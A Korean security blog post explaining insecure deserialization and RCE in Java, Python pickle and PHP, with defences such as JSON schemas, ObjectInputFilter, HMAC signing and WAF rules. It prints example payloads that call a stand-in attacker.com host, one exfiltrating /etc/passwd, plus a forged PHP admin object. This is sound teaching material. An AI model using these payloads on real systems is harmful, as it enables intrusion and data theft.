---
title: "안전하지 않은 역직렬화: RCE로 이어지는 위험"
description: "직렬화된 객체를 신뢰 없이 역직렬화할 때 발생하는 Remote Code Execution(RCE) 취약점의 원리, Java·Python·PHP 실제 사례, 그리고 안전한 대안 설계 방법을 다룹니다."
author: "PALDYN Team"
pubDate: "2026-06-05"
archiveOrder: 5
type: "knowledge"
category: "Security"
tags: ["역직렬화", "Deserialization", "RCE", "OWASP", "Java보안", "웹보안"]
featured: false
draft: false
---

[지난 글](/posts/websec-xxe/)에서 XXE 인젝션 공격을 살펴봤다. 이번에는 OWASP Top 10의 악명 높은 항목, **안전하지 않은 역직렬화(Insecure Deserialization)** 를 다룬다. 이 취약점이 위험한 이유는 악용에 성공하면 곧바로 서버 원격 코드 실행(RCE)으로 이어질 수 있기 때문이다.

## 직렬화와 역직렬화란?

직렬화(Serialization)는 객체를 전송이나 저장이 가능한 바이트 스트림으로 변환하는 과정이다. 역직렬화(Deserialization)는 그 반대로 바이트 스트림을 다시 객체로 복원한다. 많은 프레임워크가 세션 관리, 캐싱, 메시지 큐 등에 이 기능을 사용한다.

![안전하지 않은 역직렬화 공격 흐름](/assets/posts/websec-insecure-deserialization-attack.svg)

## 왜 위험한가?

역직렬화 과정에서 객체가 복원될 때 클래스의 생성자나 특수 메서드(`__reduce__`, `readObject` 등)가 자동으로 실행된다. 공격자가 이 과정에 개입해 악의적인 객체를 주입하면 **임의 코드가 서버에서 실행**된다.

## Java 역직렬화 취약점

```java
// ❌ 위험: ObjectInputStream으로 신뢰되지 않은 입력 역직렬화
@PostMapping("/api/data")
public Response processData(
    @RequestBody byte[] serializedData) throws Exception {

    // 공격자가 제어하는 직렬화 데이터를 그대로 역직렬화!
    ObjectInputStream ois = new ObjectInputStream(
        new ByteArrayInputStream(serializedData));
    MyObject obj = (MyObject) ois.readObject();  // RCE 가능
    return process(obj);
}
```

공격자는 Apache Commons Collections 등의 가젯 체인을 이용해 악의적인 페이로드를 만들 수 있다.

```bash
# ysoserial 도구로 페이로드 생성 (보안 연구 목적)
java -jar ysoserial.jar CommonsCollections6 \
  'curl http://attacker.com/$(cat /etc/passwd)' > payload.ser
```

## Python Pickle 취약점

```python
import pickle
import os

# ❌ 절대 금지: 신뢰되지 않은 pickle 데이터 역직렬화
def load_user_session(session_data: bytes):
    return pickle.loads(session_data)  # RCE 취약점!

# 공격자가 만들 수 있는 악의적 페이로드
class MaliciousPayload:
    def __reduce__(self):
        # 역직렬화 시 이 코드가 실행됨
        return (os.system, ('curl http://attacker.com/exfil',))

payload = pickle.dumps(MaliciousPayload())
# 이 payload가 서버에서 역직렬화되면 RCE 발생
```

## PHP 역직렬화 취약점

```php
<?php
// ❌ 위험: 사용자 입력을 unserialize
$data = $_COOKIE['session'];
$user = unserialize($data);  // 매직 메서드 __wakeup, __destruct 실행!

// 공격자 페이로드 예시
// O:4:"User":2:{s:4:"name";s:4:"test";s:5:"admin";b:1;}
// → admin: true 로 직렬화된 User 객체
```

## 방어 전략

![역직렬화 방어 전략](/assets/posts/websec-insecure-deserialization-defense.svg)

### 1. JSON 직렬화 사용 (최선의 방어)

바이너리 직렬화 대신 JSON을 사용하면 복잡한 객체 그래프와 가젯 체인 문제를 원천 차단한다.

```python
import json
from marshmallow import Schema, fields, ValidationError

class UserSchema(Schema):
    id = fields.Int(required=True)
    name = fields.Str(required=True, validate=lambda s: len(s) <= 100)
    role = fields.Str(load_default='user',
                      validate=lambda r: r in ['user', 'editor'])

# ✅ 안전: JSON + 스키마 검증
def load_user_data(json_str: str) -> dict:
    schema = UserSchema()
    try:
        return schema.loads(json_str)
    except ValidationError as e:
        raise ValueError(f"Invalid data: {e.messages}")
```

### 2. Java — 허용 클래스 목록

```java
// ✅ Java 9+ ObjectInputFilter 사용
import java.io.ObjectInputFilter;

ObjectInputStream ois = new ObjectInputStream(inputStream);

// 허용된 클래스만 역직렬화
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
    "com.myapp.model.*;java.lang.*;!*"
);
ois.setObjectInputFilter(filter);

MyObject obj = (MyObject) ois.readObject();
```

### 3. HMAC 서명으로 무결성 검증

```python
import hmac
import hashlib
import json
import base64

SECRET_KEY = os.environ['SERIALIZATION_SECRET']

def serialize_signed(data: dict) -> str:
    payload = json.dumps(data).encode()
    signature = hmac.new(
        SECRET_KEY.encode(), payload, hashlib.sha256
    ).hexdigest()
    return base64.b64encode(
        json.dumps({'data': data, 'sig': signature}).encode()
    ).decode()

def deserialize_verified(token: str) -> dict:
    raw = json.loads(base64.b64decode(token))
    expected_sig = hmac.new(
        SECRET_KEY.encode(),
        json.dumps(raw['data']).encode(),
        hashlib.sha256
    ).hexdigest()

    # 서명 검증 실패 시 역직렬화 거부
    if not hmac.compare_digest(raw['sig'], expected_sig):
        raise ValueError("Invalid signature — data may be tampered")

    return raw['data']
```

### 4. 네트워크 수준 방어

```yaml
# 역직렬화 공격 시 자주 사용되는 페이로드 패턴 차단 (WAF 규칙)
- rule: "Block Java serialization magic bytes"
  pattern: "rO0AB"  # base64 encoded Java serialization header
  action: deny

- rule: "Block PHP serialization"
  pattern: "O:[0-9]+:"
  action: deny
```

## 핵심 원칙

신뢰할 수 없는 소스에서 온 직렬화 데이터는 **절대** 역직렬화하면 안 된다. 만약 직렬화가 반드시 필요하다면 다음을 지킨다.

1. JSON과 같은 안전한 포맷 사용
2. 역직렬화 전 반드시 서명/무결성 검증
3. Java라면 ObjectInputFilter로 클래스 허용 목록 설정
4. 역직렬화 코드를 최소한의 권한으로 실행 (샌드박스)

---

**지난 글:** [XXE 인젝션: XML 외부 엔티티 공격 완전 해설](/posts/websec-xxe/)

**다음 글:** [취약한 인증 메커니즘 탐구하기](/posts/websec-broken-authentication/)

<br>
읽어주셔서 감사합니다. 😊
